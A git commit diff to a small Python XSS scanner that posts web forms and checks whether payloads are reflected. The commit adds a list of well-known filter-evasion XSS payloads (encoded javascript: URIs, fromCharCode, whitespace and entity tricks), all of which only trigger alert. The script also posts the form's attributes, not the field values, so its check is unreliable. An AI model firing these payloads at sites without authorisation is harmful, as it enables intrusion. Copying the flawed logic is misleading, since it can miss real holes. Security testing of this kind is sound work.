d3b80fc338850f3d0d358c21f65476de44ae5e56
V <58628545+Wh1teHatUn1c0rn@users.noreply.github.com>
2023-07-05 02:33:30 +0200

    Update xssvulnscanner.py

--- xssvulnscanner.py
+++ xssvulnscanner.py
@@ -1,9 +1,9 @@
 import requests
 from bs4 import BeautifulSoup
-
+import re
 
 def unicorn_crew_scan(url):
-    # Send a get and post request to the URL
+    # Send a GET request to the specified URL
     response = requests.get(url)
 
     # Parse the HTML content of the response
@@ -12,34 +12,54 @@ def unicorn_crew_scan(url):
     # Find all input fields in the HTML form
     form_fields = soup.find_all('input')
 
-    # Store potential vulnerabilities
-    vulnerabilities = []
+    # List to store potential XSS vulnerabilities
+    xss_vulnerabilities = []
 
     # Iterate over each input field and inject a malicious payload
     for field in form_fields:
-        # Create a payload
-        payload = "<script>alert('XSS vulnerability found!');</script>"
+        # Create a payload by injecting a simple XSS script
+        payloads = [
+            "<script>alert('XSS Vulnerability Found!');</script>",
+            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
+            "<IMG SRC=j&#X41vascript:alert('XSS')>",
+            "<IMG SRC=`javascript:alert('XSS')`>",
+            "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
+            "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
+            "<IMG SRC=JaVaScRiPt:alert('XSS')>",
+            "<IMG SRC=javascript:alert('XSS')>",
+            "<IMG SRC=\"jav	ascript:alert('XSS');\">",
+            "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
+            "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
+            "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
+            "<IMG SRC=\" &#14;  javascript:alert('XSS');\">"
+        ]
 
-        # Replace the field value with a payload
-        field['value'] = payload
+        # Iterate over each payload
+        for payload in payloads:
+            # Replace the field value with the payload
+            field['value'] = payload
 
-        # Submit the modified form
-        response = requests.post(url, data=soup.form.attrs)
+            # Submit the modified form
+            response = requests.post(url, data=soup.form.attrs)
 
-        # Check if the payload appears in the response
-        if payload in response.text:
-            vulnerabilities.append({
-                'field_name': field.get('name'),
-                'payload': payload
-            })
+            # Check if the payload appears in the response
+            if re.search(re.escape(payload), response.text, re.IGNORECASE):
+                xss_vulnerabilities.append({
+                    'field_name': field.get('name'),
+                    'payload': payload
+                })
+
     # Print the results
-    if vulnerabilities:
-        print("Potential vulners found: ")
-        for vuln in vulnerabilities:
+    if xss_vulnerabilities:
+        print("Potential XSS vulnerabilities found:")
+        for vuln in xss_vulnerabilities:
             print("Field Name:", vuln['field_name'])
             print("Payload:", vuln['payload'])
-            print("-----------------")
-        else:
-            print("No vulnerabilities found")
+            print("--------------------")
+    else:
+        print("No potential XSS vulnerabilities found.")
 
-            unicorn_crew_scan("url")
+    print("Execution completed.")
+
+# Example usage
+unicorn_crew_scan("url")
